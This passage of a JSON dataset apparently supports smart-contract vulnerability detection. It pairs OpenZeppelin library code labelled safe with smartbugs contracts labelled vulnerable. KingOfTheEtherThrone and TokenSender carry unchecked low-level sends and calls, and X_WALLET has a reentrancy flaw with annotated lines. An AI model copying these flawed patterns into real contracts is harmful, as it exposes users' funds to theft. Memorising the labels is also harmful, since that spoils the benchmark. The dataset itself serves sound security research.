OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(208, not(0)))\n        }\n    }\n\n    function replace_24_6(bytes24 self, bytes6 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes6 oldValue = extract_24_6(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(208, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_8(bytes24 self, uint8 offset) internal pure returns (bytes8 result) {\n        if (offset > 16) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(192, not(0)))\n        }\n    }\n\n    function replace_24_8(bytes24 self, bytes8 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes8 oldValue = extract_24_8(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(192, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_10(bytes24 self, uint8 offset) internal pure returns (bytes10 result) {\n        if (offset > 14) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(176, not(0)))\n        }\n    }\n\n    function replace_24_10(bytes24 self, bytes10 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes10 oldValue = extract_24_10(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(176, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_12(bytes24 self, uint8 offset) internal pure returns (bytes12 result) {\n        if (offset > 12) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(160, not(0)))\n        }\n    }\n\n    function replace_24_12(bytes24 self, bytes12 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes12 oldValue = extract_24_12(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(160, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_16(bytes24 self, uint8 offset) internal pure returns (bytes16 result) {\n        if (offset > 8) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(128, not(0)))\n        }\n    }\n\n    function replace_24_16(bytes24 self, bytes16 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes16 oldValue = extract_24_16(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(128, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_20(bytes24 self, uint8 offset) internal pure returns (bytes20 result) {\n        if (offset > 4) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(96, not(0)))\n        }\n    }\n\n    function replace_24_20(bytes24 self, bytes20 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes20 oldValue = extract_24_20(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(96, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_24_22(bytes24 self, uint8 offset) internal pure returns (bytes22 result) {\n        if (offset > 2) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(80, not(0)))\n        }\n    }\n\n    function replace_24_22(bytes24 self, bytes22 value, uint8 offset) internal pure returns (bytes24 result) {\n        bytes22 oldValue = extract_24_22(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(80, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_1(bytes28 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 27) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_28_1(bytes28 self, bytes1 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes1 oldValue = extract_28_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_2(bytes28 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 26) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_28_2(bytes28 self, bytes2 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes2 oldValue = extract_28_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_4(bytes28 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 24) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_28_4(bytes28 self, bytes4 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes4 oldValue = extract_28_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_6(bytes28 self, uint8 offset) internal pure returns (bytes6 result) {\n        if (offset > 22) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(208, not(0)))\n        }\n    }\n\n    function replace_28_6(bytes28 self, bytes6 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes6 oldValue = extract_28_6(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(208, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_8(bytes28 self, uint8 offset) internal pure returns (bytes8 result) {\n        if (offset > 20) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(192, not(0)))\n        }\n    }\n\n    function replace_28_8(bytes28 self, bytes8 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes8 oldValue = extract_28_8(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(192, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_10(bytes28 self, uint8 offset) internal pure returns (bytes10 result) {\n        if (offset > 18) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(176, not(0)))\n        }\n    }\n\n    function replace_28_10(bytes28 self, bytes10 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes10 oldValue = extract_28_10(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(176, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_12(bytes28 self, uint8 offset) internal pure returns (bytes12 result) {\n        if (offset > 16) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(160, not(0)))\n        }\n    }\n\n    function replace_28_12(bytes28 self, bytes12 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes12 oldValue = extract_28_12(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(160, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_16(bytes28 self, uint8 offset) internal pure returns (bytes16 result) {\n        if (offset > 12) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(128, not(0)))\n        }\n    }\n\n    function replace_28_16(bytes28 self, bytes16 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes16 oldValue = extract_28_16(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(128, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_20(bytes28 self, uint8 offset) internal pure returns (bytes20 result) {\n        if (offset > 8) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(96, not(0)))\n        }\n    }\n\n    function replace_28_20(bytes28 self, bytes20 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes20 oldValue = extract_28_20(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(96, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_22(bytes28 self, uint8 offset) internal pure returns (bytes22 result) {\n        if (offset > 6) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(80, not(0)))\n        }\n    }\n\n    function replace_28_22(bytes28 self, bytes22 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes22 oldValue = extract_28_22(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(80, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_28_24(bytes28 self, uint8 offset) internal pure returns (bytes24 result) {\n        if (offset > 4) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(64, not(0)))\n        }\n    }\n\n    function replace_28_24(bytes28 self, bytes24 value, uint8 offset) internal pure returns (bytes28 result) {\n        bytes24 oldValue = extract_28_24(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(64, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_1(bytes32 self, uint8 offset) internal pure returns (bytes1 result) {\n        if (offset > 31) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(248, not(0)))\n        }\n    }\n\n    function replace_32_1(bytes32 self, bytes1 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes1 oldValue = extract_32_1(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(248, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_2(bytes32 self, uint8 offset) internal pure returns (bytes2 result) {\n        if (offset > 30) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(240, not(0)))\n        }\n    }\n\n    function replace_32_2(bytes32 self, bytes2 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes2 oldValue = extract_32_2(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(240, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_4(bytes32 self, uint8 offset) internal pure returns (bytes4 result) {\n        if (offset > 28) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(224, not(0)))\n        }\n    }\n\n    function replace_32_4(bytes32 self, bytes4 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes4 oldValue = extract_32_4(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(224, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_6(bytes32 self, uint8 offset) internal pure returns (bytes6 result) {\n        if (offset > 26) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(208, not(0)))\n        }\n    }\n\n    function replace_32_6(bytes32 self, bytes6 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes6 oldValue = extract_32_6(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(208, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_8(bytes32 self, uint8 offset) internal pure returns (bytes8 result) {\n        if (offset > 24) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(192, not(0)))\n        }\n    }\n\n    function replace_32_8(bytes32 self, bytes8 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes8 oldValue = extract_32_8(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(192, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_10(bytes32 self, uint8 offset) internal pure returns (bytes10 result) {\n        if (offset > 22) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(176, not(0)))\n        }\n    }\n\n    function replace_32_10(bytes32 self, bytes10 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes10 oldValue = extract_32_10(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(176, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_12(bytes32 self, uint8 offset) internal pure returns (bytes12 result) {\n        if (offset > 20) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(160, not(0)))\n        }\n    }\n\n    function replace_32_12(bytes32 self, bytes12 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes12 oldValue = extract_32_12(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(160, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_16(bytes32 self, uint8 offset) internal pure returns (bytes16 result) {\n        if (offset > 16) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(128, not(0)))\n        }\n    }\n\n    function replace_32_16(bytes32 self, bytes16 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes16 oldValue = extract_32_16(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(128, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_20(bytes32 self, uint8 offset) internal pure returns (bytes20 result) {\n        if (offset > 12) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(96, not(0)))\n        }\n    }\n\n    function replace_32_20(bytes32 self, bytes20 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes20 oldValue = extract_32_20(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(96, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_22(bytes32 self, uint8 offset) internal pure returns (bytes22 result) {\n        if (offset > 10) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(80, not(0)))\n        }\n    }\n\n    function replace_32_22(bytes32 self, bytes22 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes22 oldValue = extract_32_22(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(80, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_24(bytes32 self, uint8 offset) internal pure returns (bytes24 result) {\n        if (offset > 8) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(64, not(0)))\n        }\n    }\n\n    function replace_32_24(bytes32 self, bytes24 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes24 oldValue = extract_32_24(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(64, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n\n    function extract_32_28(bytes32 self, uint8 offset) internal pure returns (bytes28 result) {\n        if (offset > 4) revert OutOfRangeAccess();\n        assembly (\"memory-safe\") {\n            result := and(shl(mul(8, offset), self), shl(32, not(0)))\n        }\n    }\n\n    function replace_32_28(bytes32 self, bytes28 value, uint8 offset) internal pure returns (bytes32 result) {\n        bytes28 oldValue = extract_32_28(self, offset);\n        assembly (\"memory-safe\") {\n            value := and(value, shl(32, not(0)))\n            result := xor(self, shr(mul(8, offset), xor(oldValue, value)))\n        }\n    }\n}\n",
    "num_lines": 1657,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "king_of_the_ether_throne",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/king_of_the_ether_throne.sol",
    "contract_code": "/*\n * @source: https://github.com/kieranelby/KingOfTheEtherThrone/blob/v0.4.0/contracts/KingOfTheEtherThrone.sol\n * @author: -\n * @vulnerable_at_lines: 110,118,132,174\n */\n\n// A chain-game contract that maintains a 'throne' which agents may pay to rule.\n// See www.kingoftheether.com & https://github.com/kieranelby/KingOfTheEtherThrone .\n// (c) Kieran Elby 2016. All rights reserved.\n// v0.4.0.\n// Inspired by ethereumpyramid.com and the (now-gone?) \"magnificent bitcoin gem\".\n\n// This contract lives on the blockchain at 0xb336a86e2feb1e87a328fcb7dd4d04de3df254d0\n// and was compiled (using optimization) with:\n// Solidity version: 0.2.1-fad2d4df/.-Emscripten/clang/int linked to libethereum\n\n// For future versions it would be nice to ...\n// TODO - enforce time-limit on reign (can contracts do that without external action)?\n// TODO - add a random reset?\n// TODO - add bitcoin bridge so agents can pay in bitcoin?\n// TODO - maybe allow different return payment address?\n\n//added pragma version\npragma solidity ^0.4.0;\n\ncontract KingOfTheEtherThrone {\n\n    struct Monarch {\n        // Address to which their compensation will be sent.\n        address etherAddress;\n        // A name by which they wish to be known.\n        // NB: Unfortunately \"string\" seems to expose some bugs in web3.\n        string name;\n        // How much did they pay to become monarch?\n        uint claimPrice;\n        // When did their rule start (based on block.timestamp)?\n        uint coronationTimestamp;\n    }\n\n    // The wizard is the hidden power behind the throne; they\n    // occupy the throne during gaps in succession and collect fees.\n    address wizardAddress;\n\n    // Used to ensure only the wizard can do some things.\n    modifier onlywizard { if (msg.sender == wizardAddress) _; }\n\n    // How much must the first monarch pay?\n    uint constant startingClaimPrice = 100 finney;\n\n    // The next claimPrice is calculated from the previous claimFee\n    // by multiplying by claimFeeAdjustNum and dividing by claimFeeAdjustDen -\n    // for example, num=3 and den=2 would cause a 50% increase.\n    uint constant claimPriceAdjustNum = 3;\n    uint constant claimPriceAdjustDen = 2;\n\n    // How much of each claimFee goes to the wizard (expressed as a fraction)?\n    // e.g. num=1 and den=100 would deduct 1% for the wizard, leaving 99% as\n    // the compensation fee for the usurped monarch.\n    uint constant wizardCommissionFractionNum = 1;\n    uint constant wizardCommissionFractionDen = 100;\n\n    // How much must an agent pay now to become the monarch?\n    uint public currentClaimPrice;\n\n    // The King (or Queen) of the Ether.\n    Monarch public currentMonarch;\n\n    // Earliest-first list of previous throne holders.\n    Monarch[] public pastMonarchs;\n\n    // Create a new throne, with the creator as wizard and first ruler.\n    // Sets up some hopefully sensible defaults.\n    function KingOfTheEtherThrone() {\n        wizardAddress = msg.sender;\n        currentClaimPrice = startingClaimPrice;\n        currentMonarch = Monarch(\n            wizardAddress,\n            \"[Vacant]\",\n            0,\n            block.timestamp\n        );\n    }\n\n    function numberOfMonarchs() constant returns (uint n) {\n        return pastMonarchs.length;\n    }\n\n    // Fired when the throne is claimed.\n    // In theory can be used to help build a front-end.\n    event ThroneClaimed(\n        address usurperEtherAddress,\n        string usurperName,\n        uint newClaimPrice\n    );\n\n    // Fallback function - simple transactions trigger this.\n    // Assume the message data is their desired name.\n    function() {\n        claimThrone(string(msg.data));\n    }\n\n    // Claim the throne for the given name by paying the currentClaimFee.\n    function claimThrone(string name) {\n\n        uint valuePaid = msg.value;\n\n        // If they paid too little, reject claim and refund their money.\n        if (valuePaid < currentClaimPrice) {\n            // <yes> <report> UNCHECKED_LL_CALLS\n            msg.sender.send(valuePaid);\n            return;\n        }\n\n        // If they paid too much, continue with claim but refund the excess.\n        if (valuePaid > currentClaimPrice) {\n            uint excessPaid = valuePaid - currentClaimPrice;\n            // <yes> <report> UNCHECKED_LL_CALLS\n            msg.sender.send(excessPaid);\n            valuePaid = valuePaid - excessPaid;\n        }\n\n        // The claim price payment goes to the current monarch as compensation\n        // (with a commission held back for the wizard). We let the wizard's\n        // payments accumulate to avoid wasting gas sending small fees.\n\n        uint wizardCommission = (valuePaid * wizardCommissionFractionNum) / wizardCommissionFractionDen;\n\n        uint compensation = valuePaid - wizardCommission;\n\n        if (currentMonarch.etherAddress != wizardAddress) {\n            // <yes> <report> UNCHECKED_LL_CALLS\n            currentMonarch.etherAddress.send(compensation);\n        } else {\n            // When the throne is vacant, the fee accumulates for the wizard.\n        }\n\n        // Usurp the current monarch, replacing them with the new one.\n        pastMonarchs.push(currentMonarch);\n        currentMonarch = Monarch(\n            msg.sender,\n            name,\n            valuePaid,\n            block.timestamp\n        );\n\n        // Increase the claim fee for next time.\n        // Stop number of trailing decimals getting silly - we round it a bit.\n        uint rawNewClaimPrice = currentClaimPrice * claimPriceAdjustNum / claimPriceAdjustDen;\n        if (rawNewClaimPrice < 10 finney) {\n            currentClaimPrice = rawNewClaimPrice;\n        } else if (rawNewClaimPrice < 100 finney) {\n            currentClaimPrice = 100 szabo * (rawNewClaimPrice / 100 szabo);\n        } else if (rawNewClaimPrice < 1 ether) {\n            currentClaimPrice = 1 finney * (rawNewClaimPrice / 1 finney);\n        } else if (rawNewClaimPrice < 10 ether) {\n            currentClaimPrice = 10 finney * (rawNewClaimPrice / 10 finney);\n        } else if (rawNewClaimPrice < 100 ether) {\n            currentClaimPrice = 100 finney * (rawNewClaimPrice / 100 finney);\n        } else if (rawNewClaimPrice < 1000 ether) {\n            currentClaimPrice = 1 ether * (rawNewClaimPrice / 1 ether);\n        } else if (rawNewClaimPrice < 10000 ether) {\n            currentClaimPrice = 10 ether * (rawNewClaimPrice / 10 ether);\n        } else {\n            currentClaimPrice = rawNewClaimPrice;\n        }\n\n        // Hail the new monarch!\n        ThroneClaimed(currentMonarch.etherAddress, currentMonarch.name, currentClaimPrice);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function sweepCommission(uint amount) onlywizard {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        wizardAddress.send(amount);\n    }\n\n    // Used only by the wizard to collect his commission.\n    function transferOwnership(address newOwner) onlywizard {\n        wizardAddress = newOwner;\n    }\n\n}\n",
    "num_lines": 183,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "IAccessManaged",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/access/manager/IAccessManaged.sol",
    "contract_code": "// SPDX-License-Identifier: MIT\n// OpenZeppelin Contracts (last updated v5.4.0) (access/manager/IAccessManaged.sol)\n\npragma solidity >=0.8.4;\n\ninterface IAccessManaged {\n    /**\n     * @dev Authority that manages this contract was updated.\n     */\n    event AuthorityUpdated(address authority);\n\n    error AccessManagedUnauthorized(address caller);\n    error AccessManagedRequiredDelay(address caller, uint32 delay);\n    error AccessManagedInvalidAuthority(address authority);\n\n    /**\n     * @dev Returns the current authority.\n     */\n    function authority() external view returns (address);\n\n    /**\n     * @dev Transfers control to a new authority. The caller must be the current authority.\n     */\n    function setAuthority(address) external;\n\n    /**\n     * @dev Returns true only in the context of a delayed restricted call, at the moment that the scheduled operation is\n     * being consumed. Prevents denial of service for delayed restricted calls in the case that the contract performs\n     * attacker controlled calls.\n     */\n    function isConsumingScheduledOp() external view returns (bytes4);\n}\n",
    "num_lines": 33,
    "vulnerability_type": "none",
    "ground_truth_vulnerabilities": [],
    "is_vulnerable": false,
    "source": "openzeppelin"
  },
  {
    "contract_name": "0x93c32845fae42c83a70e5f06214c8433665c2ab5",
    "contract_path": "data/raw/smartbugs-curated/dataset/reentrancy/0x93c32845fae42c83a70e5f06214c8433665c2ab5.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 29\n */\n\npragma solidity ^0.4.25;\n\ncontract X_WALLET\n{\n    function Put(uint _unlockTime)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        acc.balance += msg.value;\n        acc.unlockTime = _unlockTime>now?_unlockTime:now;\n        LogFile.AddMessage(msg.sender,msg.value,\"Put\");\n    }\n\n    function Collect(uint _am)\n    public\n    payable\n    {\n        var acc = Acc[msg.sender];\n        if( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime)\n        {\n            // <yes> <report> REENTRANCY\n            if(msg.sender.call.value(_am)())\n            {\n                acc.balance-=_am;\n                LogFile.AddMessage(msg.sender,_am,\"Collect\");\n            }\n        }\n    }\n\n    function() \n    public \n    payable\n    {\n        Put(0);\n    }\n\n    struct Holder   \n    {\n        uint unlockTime;\n        uint balance;\n    }\n\n    mapping (address => Holder) public Acc;\n\n    Log LogFile;\n\n    uint public MinSum = 1 ether;    \n\n    function X_WALLET(address log) public{\n        LogFile = Log(log);\n    }\n}\n\n\ncontract Log \n{\n    struct Message\n    {\n        address Sender;\n        string  Data;\n        uint Val;\n        uint  Time;\n    }\n\n    Message[] public History;\n\n    Message LastMsg;\n\n    function AddMessage(address _adr,uint _val,string _data)\n    public\n    {\n        LastMsg.Sender = _adr;\n        LastMsg.Time = now;\n        LastMsg.Val = _val;\n        LastMsg.Data = _data;\n        History.push(LastMsg);\n    }\n}",
    "num_lines": 85,
    "vulnerability_type": "reentrancy",
    "ground_truth_vulnerabilities": [
      "reentrancy"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "0xec329ffc97d75fe03428ae155fc7793431487f63",
    "contract_path": "data/raw/smartbugs-curated/dataset/unchecked_low_level_calls/0xec329ffc97d75fe03428ae155fc7793431487f63.sol",
    "contract_code": "/*\n * @source: etherscan.io \n * @author: -\n * @vulnerable_at_lines: 30\n */\n\npragma solidity ^0.4.11; /* originally >=0.4.11 */\n\ncontract Owned {\n    function Owned() {\n        owner = msg.sender;\n    }\n\n    address public owner;\n\n    // This contract only defines a modifier and a few useful functions\n    // The function body is inserted where the special symbol \"_\" in the\n    // definition of a modifier appears.\n    modifier onlyOwner { if (msg.sender == owner) _; }\n\n    function changeOwner(address _newOwner) onlyOwner {\n        owner = _newOwner;\n    }\n\n    // This is a general safty function that allows the owner to do a lot\n    //  of things in the unlikely event that something goes wrong\n    // _dst is the contract being called making this like a 1/1 multisig\n    function execute(address _dst, uint _value, bytes _data) onlyOwner {\n        // <yes> <report> UNCHECKED_LL_CALLS\n        _dst.call.value(_value)(_data);\n    }\n}\n// to get the needed token functions in the contract\ncontract Token {\n    function transfer(address, uint) returns(bool);\n    function balanceOf(address) constant returns (uint);\n}\n\ncontract TokenSender is Owned {\n    Token public token; // the token we are working with\n    uint public totalToDistribute;\n\n    uint public next;\n\n\n    struct Transfer {\n        address addr;\n        uint amount;\n    }\n\n    Transfer[] public transfers;\n\n    function TokenSender(address _token) {\n        token = Token(_token);\n    }\n\n    // this is a used to save gas\n    uint constant D160 = 0x0010000000000000000000000000000000000000000;\n\n    // This is the function that makes the list of transfers and various\n    //  checks around that list, it is a little tricky, the data input is\n    //  structured with the `amount` and the (receiving) `addr` combined as one\n    //  long number and then this number is deconstructed in this function to\n    //  save gas and reduce the number of `0`'s that are needed to be stored\n    //   on the blockchain\n    function fill(uint[] data) onlyOwner {\n\n        // If the send has started then we just throw\n        if (next>0) throw;\n\n        uint acc;\n        uint offset = transfers.length;\n        transfers.length = transfers.length + data.length;\n        for (uint i = 0; i < data.length; i++ ) {\n            address addr = address( data[i] & (D160-1) );\n            uint amount = data[i] / D160;\n\n            transfers[offset + i].addr = addr;\n            transfers[offset + i].amount = amount;\n            acc += amount;\n        }\n        totalToDistribute += acc;\n    }\n    // This function actually makes the sends and tracks the amount of gas used\n    //  if it takes more gas than was sent with the transaction then this\n    //  function will need to be called a few times until\n    function run() onlyOwner {\n        if (transfers.length == 0) return;\n\n        // Keep next in the stack var mNext to save gas\n        uint mNext = next;\n\n        // Set the contract as finalized to avoid reentrance\n        next = transfers.length;\n\n        if ((mNext == 0 ) && ( token.balanceOf(this) != totalToDistribute)) throw;\n\n        while ((mNext<transfers.length) && ( gas() > 150000 )) {\n            uint amount = transfers[mNext].amount;\n            address addr = transfers[mNext].addr;\n            if (amount > 0) {\n                if (!token.transfer(addr, transfers[mNext].amount)) throw;\n            }\n            mNext ++;\n        }\n\n        // Set the next to the actual state.\n        next = mNext;\n    }\n\n\n    ///////////////////////\n    // Helper functions\n    ///////////////////////\n\n    function hasTerminated() constant returns (bool) {\n        if (transfers.length == 0) return false;\n        if (next < transfers.length) return false;\n        return true;\n    }\n\n    function nTransfers() constant returns (uint) {\n        return transfers.length;\n    }\n\n    function gas() internal constant returns (uint _gas) {\n        assembly {\n            _gas:= gas\n        }\n    }\n\n}\n",
    "num_lines": 133,
    "vulnerability_type": "unchecked_low_level_calls",
    "ground_truth_vulnerabilities": [
      "unchecked_low_level_calls"
    ],
    "is_vulnerable": true,
    "source": "smartbugs"
  },
  {
    "contract_name": "IERC777",
    "contract_path": "data/raw/openzeppelin-contracts/contracts/interfaces/IERC777.sol",
